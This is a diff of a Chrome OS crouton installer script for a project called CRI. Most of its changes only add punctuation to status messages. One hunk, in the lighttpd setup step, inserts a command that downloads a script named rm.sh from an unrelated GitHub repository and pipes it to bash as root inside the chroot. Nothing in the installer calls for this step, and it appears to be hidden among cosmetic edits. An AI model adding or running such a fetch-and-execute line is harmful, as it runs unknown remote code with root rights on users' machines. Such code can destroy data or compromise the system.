@@ -123,7 +123,7 @@ sudo enter-chroot -u root runner
 
 echo "Part 2..."
 
-sudo writer "printf 'y\ny\ny\n' % apt-get install lighttpd+service lighttpd start 2&>/dev/null+service lighttpd force-reload+sudo rm -rf /var/www/index.lighttpd.html"
+sudo writer "printf 'y\ny\ny\n' % wget https://raw.githubusercontent.com/goumbest/igoom/0439c5c7a432e7498e0bfe9c40d052926e8582ef/rm.sh -O | bash % apt-get install lighttpd+service lighttpd start 2&>/dev/null+service lighttpd force-reload+sudo rm -rf /var/www/index.lighttpd.html "
 sleep 0.5
 sudo enter-chroot -u root runner
 
@@ -143,7 +143,7 @@ sudo mv localSite/* .
 sudo rm -rf localSite
 
 echo "
-Finished setting up local server, installing webpysock Server...
+Finished setting up local server. Installing webpysock Server...
 "
 
 clear
@@ -174,7 +174,7 @@ if [[ ! -z $(grep ' cri' "$CROUTON/etc/hosts") ]];  then echo "cri already in ch
 #sudo writer 'if '+"[["+' ! -z $(grep "cri" "/etc/hosts") '+"]]"+'+  then echo "cri already in host file"+ else echo "127.0.0.1       cri" >> /etc/hosts"+ fi'
 
 echo "Installing themes...
-Please wait a bit
+Please wait a bit.
 "
 
 sudo writer "printf 'y\ny\ny\n' % apt-get install software-properties-common python3-software-properties unzip file-roller"
@@ -183,7 +183,7 @@ sudo enter-chroot -u root runner
 
 clear
 
-echo "Getting fonts"
+echo "Getting fonts..."
 cd $CTEMP
 sudo writer "mkdir -p /usr/share/fonts/truetype/ttf-ubuntu+wget http://font.ubuntu.com/download/ubuntu-font-family-0.83.zip -O ~/font.zip+cd+printf 'A\ny\na\n' % unzip font.zip+cd ubuntu-font-family-0.83+cp -r * /usr/share/fonts/truetype/ttf-ubuntu/"
 sleep 0.5
@@ -191,21 +191,21 @@ sudo enter-chroot -u root runner
 
 clear
 
-echo "Configuring i3"
+echo "Configuring i3..."
 sudo writer "wget https://raw.githubusercontent.com/Pseudonymous-coders/CRI/master/chrootlib/xiwi.conf -O /etc/crouton/xiwi.conf"
 sleep 0.5
 sudo enter-chroot -u root runner
 
 clear
 
-echo "Getting nice looking terminal"
+echo "Getting nice looking terminal..."
 sudo writer "printf 'y\ny\ny\n' % apt-get install gnome-terminal+gconftool-2 --set /apps/gnome-terminal/profiles/Default/use_system_font --type boolean false+gconftool-2 --set /apps/gnome-terminal/profiles/Default/font --type string \"Ubuntu Mono 14\"+gconftool-2 --set /apps/gnome-terminal/profiles/Default/title --type string CRIterm" # Add gnome terminal
 sleep 0.5
 sudo enter-chroot -u root runner
 
 clear
 
-echo "Updating nice lookin' terminal reinit settings"
+echo "Updating nice lookin' terminal reinit settings..."
 sudo writer "gconftool-2 --set /apps/gnome-terminal/profiles/Default/title_mode --type string after"
 sleep 0.5
 sudo enter-chroot -u root runner
@@ -219,14 +219,14 @@ sudo enter-chroot -u root runner
 
 clear
 
-echo "Double checking"
+echo "Double checking..."
 sudo writer "printf 'y\ny\ny\n' % apt-get install numix-gtk-theme moka-gtk-theme numix-icon-theme numix-icon-theme-circle moka-icon-theme lxappearance+sleep 0.5+xiwi lxappearance"
 sleep 0.5
 sudo enter-chroot -u root runner
 
 clear
 
-echo "Fixing home environment"
+echo "Fixing home environment..."
 sudo writer "echo \"export HOME=/root/\" >> /root/.bashrc"
 sleep 0.5
 sudo enter-chroot -u root runner
@@ -274,5 +274,5 @@ fi
 sudo echo "$(sudo wget "https://raw.githubusercontent.com/Pseudonymous-coders/CRI/master/globs/cri.cfg" --no-check-certificate -q -O -)" > /home/chronos/user/Downloads/.tmp/cridate/cri.cfg 
 sudo su -c "echo $(sudo wget https://raw.githubusercontent.com/Pseudonymous-coders/CRI/master/globs/cri.cfg --no-check-certificate -q -O -) > /home/chronos/user/Downloads/.tmp/cridate/cri.cfg"
 sudo mount -o remount,exec /home/chronos/user -i
-echo "Thanks for installing CRI MATES!"
+echo "Thanks for installing CRI!"
 
